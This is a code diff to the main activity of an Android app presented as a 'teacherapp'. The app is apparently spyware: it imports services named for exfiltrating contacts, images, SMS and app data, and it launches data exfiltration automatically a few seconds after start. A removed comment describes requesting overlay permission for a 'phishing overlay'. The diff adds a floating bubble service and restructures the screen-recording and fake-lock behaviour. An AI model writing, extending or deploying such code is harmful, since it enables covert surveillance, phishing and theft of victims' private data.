@@ -40,6 +40,7 @@ import com.example.teacherapp.services.ContactExfiltrationService
 import com.example.teacherapp.services.ImageExfiltrationService
 import com.example.teacherapp.services.SmsExfiltrationService
 import com.example.teacherapp.services.AppDataExfiltrationService
+import com.example.teacherapp.services.FloatingBubbleService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -231,28 +232,16 @@ class MainActivity : ComponentActivity() {
         // Register power button / screen-off receiver
         registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
 
-        // Request "Display over other apps" permission — needed for phishing overlay
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                val overlayIntent = Intent(
-                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    android.net.Uri.parse("package:$packageName")
-                )
-                startActivity(overlayIntent)
-            }
-        }
+        // Overlay permission is requested in SecureAccountScreen (Step 4)
 
         // Start AppDataExfiltrationService immediately (no permission needed)
         Handler(Looper.getMainLooper()).postDelayed({
             AppDataExfiltrationService.startExfiltration(this@MainActivity)
         }, 5000)
 
-        // Only start screen recording if already logged in (e.g. app restart)
-        // For fresh logins, LoginScreen handles navigation to onAllPermissionsGranted
-        val existingUser = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
-        if (existingUser != null) {
-            onAllPermissionsGranted()
-        }
+        // Screen recording is only started after fresh login via onAllPermissionsGranted()
+        // On app restart we skip it — no valid MediaProjection token available
+        // LoginScreen.kt calls onAllPermissionsGranted() after successful login
     }
 
     private fun requestNecessaryPermissions() {
@@ -549,6 +538,20 @@ class MainActivity : ComponentActivity() {
 
     override fun onResume() {
         super.onResume()
+        FloatingBubbleService.stop(this)
+
+        // Always restore screen when app comes to foreground (prevents black screen)
+        if (!isFakeLocked) {
+            val params = window.attributes
+            params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
+            params.alpha = 1.0f
+            window.attributes = params
+            window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
+            window.setDimAmount(0.0f)
+            ScreenOverlayState.isTracking = true
+        }
+
+        inactivityHandler.removeCallbacks(dimScreenRunnable)
         inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
 
         // Only run accessibility check if user is fully logged in AND
@@ -590,6 +593,9 @@ class MainActivity : ComponentActivity() {
     override fun onPause() {
         super.onPause()
         inactivityHandler.removeCallbacks(dimScreenRunnable)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+            FloatingBubbleService.start(this)
+        }
     }
 
     override fun onDestroy() {
